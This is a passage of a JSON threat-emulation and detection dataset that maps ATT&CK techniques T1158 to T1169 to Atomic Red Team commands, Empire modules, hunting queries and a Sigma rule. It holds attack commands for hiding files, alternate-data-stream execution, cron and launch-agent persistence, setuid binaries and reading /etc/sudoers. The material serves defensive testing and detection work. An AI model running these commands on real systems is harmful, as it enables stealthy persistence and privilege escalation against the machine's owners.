"falsepositives": ["Admin or User activity"], "level": "medium"}}]}, {"technique_id": "T1158", "commands": [{"source": "atomics/T1158/T1158.yaml", "command": "mkdir /var/tmp/.hidden-directory\necho \"T1158\" > /var/tmp/.hidden-directory/.hidden-file\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "attrib.exe +s %temp%\\T1158.txt\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "attrib.exe +h %temp%\\T1158.txt\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "setfile -a V /tmp/evil\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "touch /var/tmp/T1158_mac.txt\nchflags hidden /var/tmp/T1158_mac.txt\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "defaults write com.apple.finder AppleShowAllFiles YES\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo cmd /c echo \"Shell code execution.\"> %temp%\\T1158_has_ads_cmd.txt:#{ads_filename}\nfor /f \"usebackq delims=\" %i in (%temp%\\T1158_has_ads_cmd.txt:#{ads_filename}) do %i\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo cmd /c echo \"Shell code execution.\"> #{file_name}:adstest.txt\nfor /f \"usebackq delims=\" %i in (#{file_name}:adstest.txt) do %i\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo \"test\" > $env:TEMP\\T1158_has_ads_powershell.txt | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path $env:TEMP\\T1158_has_ads_powershell.txt -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\n", "name": null}, {"source": "atomics/T1158/T1158.yaml", "command": "echo \"test\" > #{file_name} | set-content -path test.txt -stream adstest.txt -value \"test\"\nset-content -path #{file_name} -stream adstest.txt -value \"test2\"\nset-content -path . -stream adstest.txt -value \"test3\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "attrib.exe +s +h * appdata", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "mkdir .hidden-directory", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "mv file to a .file", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Hidden Files and Directories": {"attack_technique": "T1158", "display_name": "Hidden Files and Directories", "atomic_tests": [{"name": "Create a hidden file in a hidden directory", "description": "Creates a hidden file inside a hidden directory\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "elevation_required": false, "command": "mkdir /var/tmp/.hidden-directory\necho \"T1158\" > /var/tmp/.hidden-directory/.hidden-file\n", "cleanup_command": "rm -rf /var/tmp/.hidden-directory/\n"}}, {"name": "Mac Hidden file", "description": "Hide a file on MacOS\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "elevation_required": false, "command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n"}}, {"name": "Create Windows System File with Attrib", "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_modify": {"description": "File to modify using Attrib command", "type": "string", "default": "%temp%\\T1158.txt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_to_modify})\n", "prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo system_Attrib_T1158 >> #{file_to_modify}\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "attrib.exe +s #{file_to_modify}\n", "cleanup_command": "del /A:S #{file_to_modify} >nul 2>&1\n"}}, {"name": "Create Windows Hidden File with Attrib", "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_modify": {"description": "File to modify using Attrib command", "type": "string", "default": "%temp%\\T1158.txt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_to_modify})\n", "prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo system_Attrib_T1158 >> #{file_to_modify}\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "attrib.exe +h #{file_to_modify}\n", "cleanup_command": "del /A:H #{file_to_modify} >nul 2>&1\n"}}, {"name": "Hidden files", "description": "Requires Apple Dev Tools\n", "supported_platforms": ["macos"], "input_arguments": {"filename": {"description": "path of file to hide", "type": "path", "default": "/tmp/evil"}}, "executor": {"name": "sh", "elevation_required": false, "command": "setfile -a V #{filename}\n"}}, {"name": "Hide a Directory", "description": "Hide a directory on MacOS\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "elevation_required": false, "command": "touch /var/tmp/T1158_mac.txt\nchflags hidden /var/tmp/T1158_mac.txt\n", "cleanup_command": "rm /var/tmp/T1158_mac.txt\n"}}, {"name": "Show all hidden files", "description": "Show all hidden files on MacOS\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "elevation_required": false, "command": "defaults write com.apple.finder AppleShowAllFiles YES\n", "cleanup_command": "defaults write com.apple.finder AppleShowAllFiles NO\n"}}, {"name": "Create ADS command prompt", "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1158_has_ads.txt:adstest.txt\"\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "File name of file to create ADS on.", "type": "string", "default": "%temp%\\T1158_has_ads_cmd.txt"}, "ads_filename": {"description": "Name of ADS file.", "type": "string", "default": "adstest.txt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_name})\n", "prereq_command": "IF EXIST #{file_name} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo normal_text >> #{file_name} >nul 2>&1\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "echo cmd /c echo \"Shell code execution.\"> #{file_name}:#{ads_filename}\nfor /f \"usebackq delims=\u03c6\" %i in (#{file_name}:#{ads_filename}) do %i\n", "cleanup_command": "del #{file_name} >nul 2>&1\n"}}, {"name": "Create ADS PowerShell", "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1158_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "File name of file to create ADS on.", "type": "string", "default": "$env:TEMP\\T1158_has_ads_powershell.txt"}, "ads_filename": {"description": "Name of ADS file.", "type": "string", "default": "adstest.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The file must exist on disk at specified location (#{file_name})\n", "prereq_command": "if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "New-Item -Path #{file_name} | Out-Null\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "echo \"test\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path #{file_name} -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\n", "cleanup_command": "Remove-Item -Path #{file_name} -ErrorAction Ignore\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100207", "os": "windows", "parent_process": "attrib.exe", "commandline_string": "+s +h * appdata", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "hidden_files_dirs", "mitre_attack": "T1158", "itw_sample": "62b623a8dd6f7bfa7d1cff7b9db19f948840f36bee5c9063eaf5b898beb23c68"}}], "command_list": ["mkdir /var/tmp/.hidden-directory\necho \"T1158\" > /var/tmp/.hidden-directory/.hidden-file\n", "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n", "attrib.exe +s %temp%\\T1158.txt\n", "attrib.exe +h %temp%\\T1158.txt\n", "setfile -a V /tmp/evil\n", "touch /var/tmp/T1158_mac.txt\nchflags hidden /var/tmp/T1158_mac.txt\n", "defaults write com.apple.finder AppleShowAllFiles YES\n", "echo cmd /c echo \"Shell code execution.\"> %temp%\\T1158_has_ads_cmd.txt:#{ads_filename}\nfor /f \"usebackq delims=\" %i in (%temp%\\T1158_has_ads_cmd.txt:#{ads_filename}) do %i\n", "echo cmd /c echo \"Shell code execution.\"> #{file_name}:adstest.txt\nfor /f \"usebackq delims=\" %i in (#{file_name}:adstest.txt) do %i\n", "echo \"test\" > $env:TEMP\\T1158_has_ads_powershell.txt | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path $env:TEMP\\T1158_has_ads_powershell.txt -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\n", "echo \"test\" > #{file_name} | set-content -path test.txt -stream adstest.txt -value \"test\"\nset-content -path #{file_name} -stream adstest.txt -value \"test2\"\nset-content -path . -stream adstest.txt -value \"test3\"\n", "attrib.exe +s +h * appdata", "```", "mkdir .hidden-directory", "```", "```", "mv file to a .file", "```"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and process_path contains \"attrib.exe\"and (process_command_line contains \"+h\"or process_command_line contains \"+s\")", "name": "Hidden Files And Directories"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"*\\\\VolumeShadowCopy*\\\\*\"or process_command_line contains \"*\\\\VolumeShadowCopy*\\\\*\")", "name": "Hidden Files And Directories VSS"}, {"product": "Splunk", "query": "There are 2 ways by which we can capture this", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history bash_command=\"mkdir .*\" | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history bash_command=\"mv * .*\" | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "find_hidden_files.sh script can be run on a regular interval and check for any suspecious file creation. A whitelist can be craeted to filter out the standard hidden files/directories in a linux system.", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "find /home/ -name \".*\"", "name": null}, {"product": "Splunk", "query": "find /home/ -type d -name \".*\"", "name": null}, {"product": "Splunk", "query": "find /home/ -type f -name \".*\"", "name": null}, {"product": "Splunk", "query": "```", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}, {"data_source": "find the hidden files/dirs from certain directory paths like (/home/$user) and dump it to a location and ingest the file and look for any malicious hidden files (scripted input to the Splunk)"}, {"data_source": {"title": "Hiding files with attrib.exe", "id": "4281cb20-2994-4580-aa63-c8b86d019934", "status": "experimental", "description": "Detects usage of attrib.exe to hide files from users.", "author": "Sami Ruohonen", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\attrib.exe", "CommandLine": "* +h *"}, "ini": {"CommandLine": "*\\desktop.ini *"}, "intel": {"ParentImage": "*\\cmd.exe", "CommandLine": "+R +H +S +A \\\\*.cui", "ParentCommandLine": "C:\\WINDOWS\\system32\\\\*.bat"}, "condition": "selection and not (ini or intel)"}, "fields": ["CommandLine", "ParentCommandLine", "User"], "tags": ["attack.defense_evasion", "attack.persistence", "attack.t1158"], "falsepositives": ["igfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)", "msiexec.exe hiding desktop.ini"], "level": "low"}}]}, {"technique_id": "T1159", "commands": [], "parsed_datasets": [{"Atomic Red Team Test - Launch Agent": {"attack_technique": "T1159", "display_name": "Launch Agent", "atomic_tests": [{"name": "Launch Agent", "description": "Create a plist and execute it\n", "supported_platforms": ["macos"], "executor": {"name": "manual", "steps": "1. Create file - .client\n\n2. osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"'\n\n3. Place the following in a new file under ~/Library/LaunchAgents as com.atomicredteam.plist\n\n4.\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n <key>KeepAlive</key>\n <true/>\n <key>Label</key>\n <string>com.client.client</string>\n <key>ProgramArguments</key>\n <array>\n <string>/Users/<update path to .clent file>/.client</string>\n </array>\n <key>RunAtLoad</key>\n <true/>\n <key>NSUIElement</key>\n <string>1</string>\n</dict>\n</plist>\n\n5. launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist\n"}}]}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1160", "commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/launchdaemonexecutable", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/launchdaemonexecutable", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Launch Daemon": {"attack_technique": "T1160", "display_name": "Launch Daemon", "atomic_tests": [{"name": "Launch Daemon", "description": "Utilize LaunchDaemon to launch `Hello World`\n", "supported_platforms": ["macos"], "executor": {"name": "manual", "steps": "1. Place the following file (com.example.hello) in /System/Library/LaunchDaemons or /Library/LaunchDaemons\n2.\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>com.example.hello</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>hello</string>\n        <string>world</string>\n    </array>\n    <key>KeepAlive</key>\n    <true/>\n</dict>\n</plist>\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/persistence/osx/launchdaemonexecutable", "ATT&CK Technique #1": "T1160", "ATT&CK Technique #2": "", "Technique": "Launch Daemon", "Concatenate for Python Dictionary": "\"python/persistence/osx/launchdaemonexecutable\":  [\"T1160\"],"}}], "command_list": ["python/persistence/osx/launchdaemonexecutable", "python/persistence/osx/launchdaemonexecutable"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1163", "commands": [{"source": "atomics/T1163/T1163.yaml", "command": "echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - rc.common": {"attack_technique": "T1163", "display_name": "rc.common", "atomic_tests": [{"name": "rc.common", "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n"}}]}}], "command_list": ["echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1164", "commands": [{"source": "atomics/T1164/T1164.yaml", "command": "sudo defaults write com.apple.loginwindow LoginHook /path/to/script\nsudo defaults delete com.apple.loginwindow LoginHook\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Re-Opened Applications": {"attack_technique": "T1164", "display_name": "Re-Opened Applications", "atomic_tests": [{"name": "Re-Opened Applications", "description": "Plist Method\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n", "supported_platforms": ["macos"], "executor": {"name": "manual", "steps": "1. create a custom plist:\n\n    ~/Library/Preferences/com.apple.loginwindow.plist\n\nor\n\n    ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist\n"}}, {"name": "Re-Opened Applications", "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n", "supported_platforms": ["macos"], "input_arguments": {"script": {"description": "path to script", "type": "path", "default": "/path/to/script"}}, "executor": {"name": "sh", "command": "sudo defaults write com.apple.loginwindow LoginHook #{script}\nsudo defaults delete com.apple.loginwindow LoginHook\n"}}]}}], "command_list": ["sudo defaults write com.apple.loginwindow LoginHook /path/to/script\nsudo defaults delete com.apple.loginwindow LoginHook\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1165", "commands": [{"source": "atomics/T1165/T1165.yaml", "command": "sudo touch /Library/StartupItems/EvilStartup.plist\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Startup Items": {"attack_technique": "T1165", "display_name": "Startup Items", "atomic_tests": [{"name": "add file to Local Library StartupItems", "description": "Modify or create an file in /Library/StartupItems\n\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "elevation_required": true, "command": "sudo touch /Library/StartupItems/EvilStartup.plist\n", "cleanup_command": "sudo rm /Library/StartupItems/EvilStartup.plist\n"}}]}}], "command_list": ["sudo touch /Library/StartupItems/EvilStartup.plist\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1166", "commands": [{"source": "atomics/T1166/T1166.yaml", "command": "cp PathToAtomicsFolder/T1166/src/hello.c /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n", "name": null}, {"source": "atomics/T1166/T1166.yaml", "command": "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod u+s /tmp/evilBinary\n", "name": null}, {"source": "atomics/T1166/T1166.yaml", "command": "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod g+s /tmp/evilBinary\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo chmod u+s hello", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo chmod u+s #{file_to_setuid}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo chmod g+s #{file_to_setuid}", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Setuid and Setgid": {"attack_technique": "T1166", "display_name": "Setuid and Setgid", "atomic_tests": [{"name": "Make and modify binary from C source", "description": "Make, change owner, and change file attributes on a C source code file\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"payload": {"description": "hello.c payload", "type": "path", "default": "PathToAtomicsFolder/T1166/src/hello.c"}}, "executor": {"name": "sh", "elevation_required": true, "command": "cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n", "cleanup_command": "sudo rm /tmp/hello\nsudo rm /tmp/hello.c\n"}}, {"name": "Set a SetUID flag on file", "description": "This test sets the SetUID flag on a file in Linux and macOS.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_to_setuid": {"description": "Path of file to set SetUID flag", "type": "path", "default": "/tmp/evilBinary"}}, "executor": {"name": "sh", "elevation_required": true, "command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+s #{file_to_setuid}\n", "cleanup_command": "sudo rm #{file_to_setuid}\n"}}, {"name": "Set a SetGID flag on file", "description": "This test sets the SetGID flag on a file in Linux and macOS.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_to_setuid": {"description": "Path of file to set SetGID flag", "type": "path", "default": "/tmp/evilBinary"}}, "executor": {"name": "sh", "elevation_required": true, "command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+s #{file_to_setuid}\n", "cleanup_command": "sudo rm #{file_to_setuid}\n"}}]}}], "command_list": ["cp PathToAtomicsFolder/T1166/src/hello.c /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n", "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod u+s /tmp/evilBinary\n", "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod g+s /tmp/evilBinary\n", "sudo chmod u+s hello", "sudo chmod u+s #{file_to_setuid}", "sudo chmod g+s #{file_to_setuid}"], "attack_paths": [], "queries": [{"product": "Splunk", "query": "index=linux sourcetype=bash_history \"chmod 4***\" OR \"chmod 2***\" OR \"chmod u+s\" OR \"chmod g+s\" | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "find Setuid: find / -type f -perm /4000 OR find / -type f -perm /u+s", "name": null}, {"product": "Splunk", "query": "find Setgid: find / -type f -perm /2000 OR find / -type f -perm /g+s", "name": null}, {"product": "Splunk", "query": "Create a scripted input to ingest the files with Setuid and Setgid bits set and compare it with the expectde whitelist.", "name": null}], "possible_detections": [{"data_source": "bash_history"}, {"data_source": "scripted_input"}]}, {"technique_id": "T1168", "commands": [{"source": "atomics/T1168/T1168.yaml", "command": "echo \"* * * * * /tmp/evil.sh\" > #{tmp_cron} && crontab #{tmp_cron}\n", "name": null}, {"source": "atomics/T1168/T1168.yaml", "command": "echo \"* * * * * #{command}\" > /tmp/persistevil && crontab /tmp/persistevil\n", "name": null}, {"source": "atomics/T1168/T1168.yaml", "command": "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/#{cron_script_name}\n", "name": null}, {"source": "atomics/T1168/T1168.yaml", "command": "echo \"#{command}\" > /etc/cron.daily/persistevil\n", "name": null}, {"source": "Threat Hunting Tables", "command": "bash crontab", "name": null}, {"source": "Threat Hunting Tables", "command": "shell crontab", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/multi/crontab", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/multi/crontab", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "at now + 1 minute -f script.sh", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \"shutdown -h now\" | at -m 23:5", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "at now + 1 minute | ping -c 4 google.com > /home/ec2-user/google6.txt", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Local Job Scheduling": {"attack_technique": "T1168", "display_name": "Local Job Scheduling", "atomic_tests": [{"name": "Cron - Replace crontab with referenced file", "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"command": {"description": "Command to execute", "type": "string", "default": "/tmp/evil.sh"}, "tmp_cron": {"description": "Temporary reference file to hold evil cron schedule", "type": "path", "default": "/tmp/persistevil"}}, "executor": {"name": "bash", "command": "echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}\n"}}, {"name": "Cron - Add script to cron folder", "description": "This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"command": {"description": "Command to execute", "type": "string", "default": "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"}, "cron_script_name": {"description": "Name of file to store in cron folder", "type": "string", "default": "persistevil"}}, "executor": {"name": "bash", "command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}\n"}}, {"name": "Event Monitor Daemon Persistence", "description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n", "supported_platforms": ["macos", "linux"], "executor": {"name": "manual", "steps": "1. Place this file in /etc/emond.d/rules/atomicredteam.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<array>\n    <dict>\n        <key>name</key>\n        <string>atomicredteam</string>\n        <key>enabled</key>\n        <true/>\n        <key>eventTypes</key>\n        <array>\n            <string>startup</string>\n        </array>\n        <key>actions</key>\n        <array>\n            <dict>\n                <key>command</key>\n                <string>/usr/bin/say</string>\n                <key>user</key>\n                <string>root</string>\n                <key>arguments</key>\n                    <array>\n                        <string>-v Tessa</string>\n                        <string>I am a persistent startup item.</string>\n                    </array>\n                <key>type</key>\n                <string>RunCommand</string>\n            </dict>\n        </array>\n    </dict>\n</array>\n</plist>\n\n2. Place an empty file in /private/var/db/emondClients/\n\n3. sudo touch /private/var/db/emondClients/randomflag\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100200", "os": "mac", "parent_process": "bash", "commandline_string": "crontab", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "cron_job", "mitre_attack": "T1168", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100202", "os": "linux", "parent_process": "shell", "commandline_string": "crontab", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "cron_job", "mitre_attack": "T1168", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/persistence/multi/crontab", "ATT&CK Technique #1": "T1168", "ATT&CK Technique #2": "", "Technique": "Local Job Scheduling", "Concatenate for Python Dictionary": "\"python/persistence/multi/crontab\":  [\"T1168\"],"}}], "command_list": ["echo \"* * * * * /tmp/evil.sh\" > #{tmp_cron} && crontab #{tmp_cron}\n", "echo \"* * * * * #{command}\" > /tmp/persistevil && crontab /tmp/persistevil\n", "echo \"echo 'Hello from Atomic Red Team' > /tmp/atomic.log\" > /etc/cron.daily/#{cron_script_name}\n", "echo \"#{command}\" > /etc/cron.daily/persistevil\n", "bash crontab", "shell crontab", "python/persistence/multi/crontab", "python/persistence/multi/crontab", "echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}", "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}", "at now + 1 minute -f script.sh", "echo \"shutdown -h now\" | at -m 23:5", "at now + 1 minute | ping -c 4 google.com > /home/ec2-user/google6.txt"], "attack_paths": [], "queries": [{"product": "Splunk", "query": "1. bash_history : track the command \"crontab\" - you may need to look for the commands crontab <file>", "name": null}, {"product": "Splunk", "query": "", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history bash_command=\"crontab *\" | table host, user_name, bash_command", "name": null}, {"product": "Splunk", "query": "2. /var/log/cron :  look for \"crontab\" & \"REPLACE\" in the cron logs", "name": null}, {"product": "Splunk", "query": "index=linux crontab replace", "name": null}, {"product": "Splunk", "query": "3. /var.log/cron - track CMD command", "name": null}, {"product": "Splunk", "query": "cat /var/log/cron | grep CMD | cut -d \" \" -f 9 |sort | uniq -c  | sort -rn will give you all the jobs which run in the environment with its number starting from high to low. You can look for a suspecious job/s which are not a part of a whitelisted jobs.", "name": null}, {"product": "Splunk", "query": "4. index=linux sourcetype=bash_history at", "name": null}], "possible_detections": [{"data_source": "/var/log/cron"}, {"data_source": "bash_history"}]}, {"technique_id": "T1169", "commands": [{"source": "atomics/T1169/T1169.yaml", "command": "sudo -l\nsudo su\ncat /etc/sudoers\nvim /etc/sudoers\n", "name": null}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "History\nOct 18 11:09:54 icbc sudo: test321: TTY = pts / 1; PWD = /; USER = # - 1; COMMAND = / usr / bin / id\nOct 18 11:11:59 icbc sudo: test321: TTY = pts / 1; PWD = /; USER = # 4294967295; COMMAND = / usr / bin / id", "name": "History"}, {"source": "Kirtar22/Litmus_Test", "command": "cat /etc/sudoers", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "vim /etc/sudoers", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - SUDO": {"attack_technique": "T1169", "display_name": "SUDO", "atomic_tests": [{"name": "Sudo usage", "description": "Common Sudo enumeration methods.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "sudo -l\nsudo su\ncat /etc/sudoers\nvim /etc/sudoers\n"}}]}}], "command_list": ["sudo -l\nsudo su\ncat /etc/sudoers\nvim /etc/sudoers\n", "History\nOct 18 11:09:54 icbc sudo: test321: TTY = pts / 1; PWD = /; USER = # - 1; COMMAND = / usr / bin / id\nOct 18 11:11:59 